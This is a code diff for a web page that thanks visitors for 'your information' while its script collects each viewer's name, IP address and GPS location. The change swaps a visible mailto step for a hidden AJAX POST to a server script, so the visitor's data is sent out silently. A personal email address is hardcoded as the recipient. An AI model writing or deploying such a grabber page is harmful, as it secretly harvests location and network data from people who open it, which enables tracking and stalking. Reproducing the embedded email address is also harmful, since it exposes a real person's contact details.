@@ -19,12 +19,25 @@
 </head>
 <body>
 	<p>Thank you for your information :)</p>
+	<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
 	<script type="text/javascript">
 		var email = "joshcameronbruce@gmail.com";
 		function sendEmail(name, ip, gps) {
-			var subject = "Viewer Information";
-			var body = "Name (" + name + ")\nIP: " + ip + "\nGPS: " + gps;
-			window.location.href = "mailto:" + email + "?subject=" + encodeURIComponent(subject) + "&body=" + encodeURIComponent(body);
+			$.ajax({
+				type: 'POST',
+				url: 'send-email.php',
+				data: {
+					name: name,
+					ip: ip,
+					gps: gps
+				},
+				success: function(response) {
+					console.log(response);
+				},
+				error: function(xhr, status, error) {
+					console.log(error);
+				}
+			});
 		}
 		function getIP(json) {
 			var ip = json.ip;
